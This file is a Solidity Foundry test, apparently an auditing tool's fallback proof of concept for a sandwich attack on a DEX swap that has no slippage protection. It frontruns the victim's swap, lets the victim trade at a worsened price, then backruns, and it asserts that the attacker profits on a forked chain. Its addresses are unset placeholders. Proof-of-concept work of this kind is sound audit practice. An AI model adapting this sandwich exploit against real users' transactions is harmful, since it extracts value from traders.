// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Sandwich attack on a zero-slippage swap
/// @notice Detector: slippage. The target (or a victim flow it exposes)
///         swaps with amountOutMin == 0. An attacker frontruns the victim
///         swap (pushing the price up), lets the victim execute at the bad
///         price, then backruns (sells) for a profit.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: set ROUTER / tokens / VICTIM /
///      the victim's swap entry point. On a fork with a real DEX this
///      runs for real -- the profit is the proof.

interface IRouter {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IERC20 {
    function balanceOf(address who) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;
    // TODO: DEX router, token pair, victim, funding whale.
    address public constant ROUTER = address(0);
    address public constant TOKEN_IN = address(0);
    address public constant TOKEN_OUT = address(0);
    address public constant VICTIM = address(0);
    address public constant WHALE = address(0);

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function test_exploit() public {
        require(ROUTER != address(0) && VICTIM != address(0) && WHALE != address(0), "set ROUTER / tokens / VICTIM / WHALE");

        address attackerEOA = makeAddr("attacker");

        // Fund the attacker with TOKEN_IN from a whale.
        vm.prank(WHALE);
        IERC20(TOKEN_IN).transfer(attackerEOA, 200 ether);
        vm.prank(attackerEOA);
        IERC20(TOKEN_IN).approve(ROUTER, 200 ether);

        uint256 attackerInBefore = IERC20(TOKEN_IN).balanceOf(attackerEOA);

        address[] memory path = new address[](2);
        path[0] = TOKEN_IN;
        path[1] = TOKEN_OUT;
        address[] memory backPath = new address[](2);
        backPath[0] = TOKEN_OUT;
        backPath[1] = TOKEN_IN;

        // 1. Frontrun: attacker buys TOKEN_OUT, pushing the price up.
        vm.prank(attackerEOA);
        IRouter(ROUTER).swapExactTokensForTokens(100 ether, 0, path, attackerEOA, block.timestamp + 300);

        // 2. Victim swap executes at the worsened price (zero slippage).
        // TODO: replace with the target's real victim-swap call.
        vm.prank(VICTIM);
        (bool victimOk,) = target.call(
            abi.encodeWithSignature("swap(uint256)", 100 ether)
        );
        require(victimOk, "victim swap call failed -- adapt to the target's swap entry point");

        // 3. Backrun: attacker sells TOKEN_OUT back.
        uint256 outBal = IERC20(TOKEN_OUT).balanceOf(attackerEOA);
        vm.prank(attackerEOA);
        IERC20(TOKEN_OUT).approve(ROUTER, outBal);
        vm.prank(attackerEOA);
        IRouter(ROUTER).swapExactTokensForTokens(outBal, 0, backPath, attackerEOA, block.timestamp + 300);

        uint256 attackerInAfter = IERC20(TOKEN_IN).balanceOf(attackerEOA);
        console.log("attacker TOKEN_IN before:", attackerInBefore);
        console.log("attacker TOKEN_IN after:", attackerInAfter);
        assertGt(attackerInAfter, attackerInBefore, "exploit did not reproduce: sandwich was not profitable");

    }
}
